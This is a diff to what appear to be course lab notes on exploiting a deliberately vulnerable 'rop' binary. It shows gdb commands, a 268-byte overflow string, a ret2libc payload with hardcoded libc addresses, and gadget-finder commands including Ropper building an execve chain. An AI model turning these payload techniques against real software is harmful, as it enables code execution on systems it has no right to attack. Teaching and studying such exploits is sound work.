@@ -2,7 +2,7 @@
 
     gdb rop
     disas vulnerable
-    break *0x08048456
+    break *0x08048456 #instruction after strcpy
     run $(python -c 'print "A"*268')
     x/200xb buffer
     >> 0xbffff230
@@ -41,4 +41,16 @@
 **Call libc**
 
     run $(python -c 'print "A"*268 + "\xa0\x1d\xe4\xb7" + "\xd0\x59\xe3\xb7" + "\xab\x29\xf6\xb7"')
+
+**Find gadgets**
+
+    https://github.com/salls/angrop
+    https://github.com/0vercl0k/rp
+
+    ~/rp/bin/rp-lin-x86 -f ~/B4M36BSY-rop-example/cmake-build-debug/rop -r5
+
+    http://shell-storm.org/blog/Return-Oriented-Programming-and-ROPgadget-tool/
+    https://github.com/sashs/Ropper
+
+    ropper --file ./rop --chain execve
 
